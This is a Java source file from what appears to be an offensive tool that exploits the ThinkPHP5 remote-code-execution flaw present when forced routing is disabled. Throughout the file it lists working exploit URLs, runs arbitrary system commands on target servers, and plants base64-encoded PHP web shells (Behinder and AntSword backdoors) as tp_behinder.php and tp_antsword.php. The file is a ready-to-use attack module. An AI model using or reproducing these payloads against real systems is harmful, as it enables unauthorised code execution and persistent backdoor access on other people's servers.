package com.guitool.tpbomb.payload;

import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.UrlUtils;

import java.util.ArrayList;

public class TP5WithoutForcedRoutingRce implements PayloadTemplate {
    final ArrayList<String> payloadList = new ArrayList<>(){{
        add("?s=index/\\think\\Request/input&filter[]=phpinfo&data=1");
        add("?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1");
        add("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1");
        add("?s=index/\\think\\View/display&content=<?=phpinfo();?>&data=1");
        add("?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=<?=phpinfo();?>");
    }};
    final ArrayList<String> getShellPayloadList = new ArrayList<>(){{
        add("?s=index/\\think\\Request/input&filter[]=system&data=command");
        add("?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=command");
        add("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=");
        add("?s=index/\\think\\View/display&content=<?=system(\"command\");?>&data=1");
        add("?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=<?=system(\"command\");?>");
    }};

    @Override
    public ResultUtils checkVulnerability(String url) {
        try {
            for (String payload : payloadList) {
                String result;
                if (!payload.contains("cacheFile")) {
                    result = UrlUtils.doGetSpecial(url + payload);
                } else {
                    UrlUtils.doGetSpecial(url + payload);
                    result = UrlUtils.doGet(url + "shell.php");
                }
                if (result == null) {
                    continue;
                }
                if (result.contains("PHP Version")) {
                    return new ResultUtils(true, "ThinkPHP5 未开启强制路由RCE", url + payload);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "ThinkPHP5 未开启强制路由RCE", "");
    }

    @Override
    public ResultUtils executeVulnerability(String url, String command) {
        String replaceCommand = command.replace(" ", "%20");
        ArrayList<String> attackPayloadList = new ArrayList<>(){{
            add("?s=index/\\think\\Request/input&filter[]=system&data=" + replaceCommand);
            add("?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + replaceCommand);
            add("?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=" + replaceCommand);
            add("?s=index/\\think\\View/display&content=<?=system(\"" + replaceCommand + "\");?>&data=1");
            add("?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=<?=system(\""+ replaceCommand + "\");?>");
        }};
        try {
            for (String payload : attackPayloadList) {
                String result;
                if (payload.contains("cacheFile")) {
                    UrlUtils.doGetSpecial(url + payload);
                    result = UrlUtils.doGet(url + "shell.php");
                } else {
                    result = UrlUtils.doGetSpecial(url + payload);
                }
                if (result == null || result.equals("页面错误")) {
                    continue;
                }
                if (!result.equals("")) {
                    return new ResultUtils(true, "", result);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

    @Override
    public ResultUtils getBehinderShell(String url) {
        String base64Shell = "echo \"PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKCQlmdW5jdGlvbiBEZWNyeXB0KCRkYXRhKQoJewoJCSRrZXk9ImU0NWUzMjlmZWI1ZDkyNWIiOyAvL%2BivpeWvhumSpeS4uui%2FnuaOpeWvhueggTMy5L2NbWQ15YC855qE5YmNMTbkvY3vvIzpu5jorqTov57mjqXlr4bnoIFyZWJleW9uZAoJCXJldHVybiBvcGVuc3NsX2RlY3J5cHQoYmFzZTY0X2RlY29kZSgkZGF0YSksICJBRVMtMTI4LUVDQiIsICRrZXksT1BFTlNTTF9QS0NTMV9QQURESU5HKTsKCX0KCSRwb3N0PURlY3J5cHQoZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0IikpOwogICAgZXZhbCgkcG9zdCk7Cj8%2B\" | base64 -d > tp_behinder.php".replace(" ", "%20");
        try {
            for (String payload : getShellPayloadList) {
                String result;
                if (!payload.contains("cacheFile")) {
                    result = UrlUtils.doGetSpecial(url + payload.replace("command", base64Shell));
                } else {
                    UrlUtils.doGetSpecial(url + payload.replace("command", base64Shell));
                    result = UrlUtils.doGet(url + "shell.php");
                }
                if (result == null) {
                    continue;
                }
                String judge = UrlUtils.doGet(url + "tp_behinder.php");
                if (judge.equals("")) {
                    return new ResultUtils(true, "", url + "tp_behinder.php");
                };
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

    @Override
    public ResultUtils getAntswordShell(String url) {
        String base64Shell = "echo PD9waHAKJGE9YXJyYXkoJF9SRVFVRVNUWyd0cCddPT4iMyIpOwokYj1hcnJheV9rZXlzKCRhKVswXTsKZXZhbCgkYik7Cj8%2B | base64 -d > tp_antsword.php".replace(" ", "%20");
        try {
            for (String payload : getShellPayloadList) {
                String result;
                if (!payload.contains("cacheFile")) {
                    result = UrlUtils.doGetSpecial(url + payload.replace("command", base64Shell));
                } else {
                    UrlUtils.doGetSpecial(url + payload);
                    result = UrlUtils.doGet(url + "shell.php");
                }
                if (result == null) {
                    continue;
                }
                String judge = UrlUtils.doGet(url + "tp_antsword.php");
                if (judge != null) {
                    return new ResultUtils(true, "", url + "tp_antsword.php");
                };
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new ResultUtils(false, "", "");
    }

}
